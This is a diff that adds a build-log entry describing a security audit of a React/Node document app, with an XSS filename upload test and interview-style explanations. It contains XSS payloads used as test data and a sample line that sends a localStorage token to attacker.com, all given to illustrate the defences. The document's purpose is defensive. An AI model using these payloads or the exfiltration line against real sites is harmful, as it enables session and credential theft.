@@ -2028,6 +2028,89 @@ Unsalted or simple salted SHA-256 algorithms can be computed at billions of atte
      4. In MongoDB, it executes `sessions.deleteMany({ 'session.userId': targetId })`.
    - If the deactivated user sends another request within milliseconds, the server finds no session, checks credentials, and returns `404 Not Found` per Rule 3.
 
+---
+
+## Build Entry: Client Storage Security Audit & XSS Immunity Verification (`<img src=x onerror=alert(1)>.pdf`)
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Investigated & Built
+- **Static Code Audit of `/client` for Web Storage & Raw HTML Injection:**
+  - Automated ripgrep search for `localStorage`, `sessionStorage`, and `dangerouslySetInnerHTML` across all files in `client/src/`.
+  - **Results:**
+    - `localStorage`: **0 runtime usages**. (Present only in comments in `LoginPage.jsx`, `AuthContext.jsx`, and `client.js` documenting that web storage is intentionally forbidden).
+    - `sessionStorage`: **0 runtime usages**. (Present only in comments in `AuthContext.jsx` noting state is kept purely in memory).
+    - `dangerouslySetInnerHTML`: **0 runtime usages**. (Present only in architecture comments in `DocumentsPage.jsx`, `SearchPage.jsx`, and `Navbar.jsx` documenting strict plain-text rendering).
+- **XSS File Upload & Plain-Text Rendering Test Suite (`backend/tests/xss-upload.test.js`):**
+  - Built an automated integration test uploading a valid PDF document with the malicious filename: `<img src=x onerror=alert(1)>.pdf`.
+  - Verified that:
+    1. The upload endpoint accepts the file safely without crashing or sanitizing the `.pdf` extension.
+    2. Stored in MongoDB verbatim with `originalFileName: "<img src=x onerror=alert(1)>.pdf"` and `name: "<img src=x onerror=alert(1)>.pdf"`.
+    3. `GET /documents` returns the file safely in JSON format.
+    4. `GET /documents/:id` returns metadata safely in JSON format.
+    5. `GET /admin/activity` records the audit event with the uncorrupted filename stored as plain metadata.
+    6. Server-side HTML templates (`adminDashboardHtml.js`) employ `escapeHtml()`, converting `<` and `>` into `&lt;` and `&gt;`.
+    7. Client-side React components render the filename strictly via standard JSX `{doc.name}` interpolation, creating a DOM `TextNode` rather than an `HTMLImageElement`.
+- **All 13 Backend Test Suites Passing:**
+  - 224 total automated tests passing cleanly across the entire repository.
+
+---
+
+### 2. Which Files Were Created / Modified
+| File | Status | Purpose |
+|---|---|---|
+| `backend/tests/xss-upload.test.js` | Created | Automated test verifying upload and plain-text output of `<img src=x onerror=alert(1)>.pdf`. |
+| `docs/BUILD_LOG.md` | Modified | Appended this security audit and verification log entry. |
+
+---
+
+### 3. Why This Design
+- **Complete Elimination of Client-Side Token Exfiltration (Zero `localStorage` / `sessionStorage`):**
+  - If a web application stores authentication tokens (JWTs, session IDs, API keys) in `localStorage` or `sessionStorage`, any Cross-Site Scripting (XSS) vulnerability anywhere on the origin allows an attacker to exfiltrate the user's session in a single line of JavaScript (`fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))`).
+  - By using `HttpOnly` session cookies combined with in-memory React context, JavaScript cannot access or exfiltrate session credentials even in worst-case injection scenarios.
+- **Strict Plain-Text Rendering (Zero `dangerouslySetInnerHTML`):**
+  - Document filenames are untrusted user input. If an application interpolates filenames into HTML strings using `dangerouslySetInnerHTML` or `element.innerHTML`, an attacker can achieve Stored XSS simply by uploading a file named `<img src=x onerror=alert(1)>.pdf` or `<svg onload=alert(document.cookie)>`.
+  - React's standard `{expression}` syntax creates DOM `TextNode` elements via `document.createTextNode()`, ensuring that angle brackets `<` and `>` are displayed as literal text rather than parsed as HTML tags.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **Stored Cross-Site Scripting via Filenames (CWE-79):**
+   - Filenames containing HTML or script payloads (such as `<img src=x onerror=alert(1)>.pdf`) are treated as opaque text strings. The browser renders them as visual characters on screen without executing JavaScript or issuing network requests.
+2. **Credential Theft via Web Storage Scraping (CWE-522 / CWE-922):**
+   - Because `localStorage` and `sessionStorage` are never used, client-side storage is completely empty of credentials.
+3. **DOM-Based XSS in Admin & Audit Logs (CWE-79):**
+   - Both the React Admin Console (`AdminPage.jsx`) and the server fallback (`adminDashboardHtml.js`) escape event metadata, ensuring administrators reviewing activity streams are immune to reflected or stored script execution.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: How does React's default JSX interpolation `{doc.name}` prevent Cross-Site Scripting (XSS), and under what specific conditions would this protection fail?
+**Answer:**
+1. **The Automatic Escaping Mechanism:**
+   - When React compiles JSX like `<span>{doc.name}</span>`, it calls `React.createElement('span', null, doc.name)`.
+   - During DOM reconciliation, React detects that the child is a primitive string and invokes `document.createTextNode(doc.name)`. Text nodes cannot contain executable HTML markup; any `<script>`, `<img>`, or `<iframe>` tags are treated as literal glyphs.
+   - When rendered via SSR (`ReactDOMServer.renderToString`), React automatically converts special characters to their HTML entity equivalents: `<` becomes `&lt;`, `>` becomes `&gt;`, `&` becomes `&amp;`, and `"` becomes `&quot;`.
+2. **When Protection Fails:**
+   - If a developer uses `dangerouslySetInnerHTML={{ __html: doc.name }}`, bypassing React's escaping.
+   - If a user input is passed directly to an execution sink like `href={doc.url}` where `doc.url = "javascript:alert(1)"`.
+   - If direct DOM manipulation is used outside React (e.g. `ref.current.innerHTML = doc.name`).
+   TrustVault strictly forbids all three patterns.
+
+#### Question 2: Why does TrustVault store session state purely in memory on the client rather than caching it in `localStorage` across page reloads?
+**Answer:**
+1. **The XSS Exfiltration Surface:**
+   - Any script running in the browser origin has unrestricted read access to `window.localStorage`. If a third-party dependency in `node_modules` is compromised (supply-chain attack) or a subtle XSS vulnerability exists, all credentials in `localStorage` can be stolen immediately.
+2. **TrustVault's In-Memory Pattern:**
+   - On the client, `AuthContext` keeps the authenticated `user` object in React memory (`useState`).
+   - The actual persistent session credential is an `HttpOnly` cookie managed entirely by the browser network stack.
+   - On page refresh, `AuthContext` makes a single background `GET /api/auth/me` request with `credentials: 'include'`. The server validates the `HttpOnly` cookie and returns user metadata.
+   - JavaScript never touches or stores the session secret.
+
+
 
 
 
